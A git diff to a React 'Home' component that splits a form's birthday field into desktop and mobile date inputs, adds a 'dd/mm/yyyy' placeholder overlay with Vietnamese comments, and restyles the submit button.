@@ -293,7 +293,35 @@ const Home = () => {
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
+                                
+                                {/* Desktop: type='date' */}
+                                <input 
+                                    type='date' 
+                                    name='birthday' 
+                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    value={formData.birthday} 
+                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
+                                />
+                                
+                                {/* Mobile: type='date' với placeholder ảo */}
+                                <div className='block sm:hidden relative'>
+                                    <input 
+                                        type='date' 
+                                        name='birthday' 
+                                        className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
+                                        value={formData.birthday} 
+                                        onChange={(e) => handleInputChange('birthday', e.target.value)}
+                                        required
+                                    />
+                                    {/* Placeholder ảo - chữ số nhỏ hơn */}
+                                    <div 
+                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium`}
+                                        onClick={() => document.querySelector('input[name="birthday"]').click()}
+                                    >
+                                        {formData.birthday || 'dd/mm/yyyy'}
+                                    </div>
+                                </div>
+                                
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
@@ -310,7 +338,7 @@ const Home = () => {
                                 />
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
+                            <button className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2' onClick={handleSubmit}>
                                 {translatedTexts.submit}
                             </button>
                         </div>
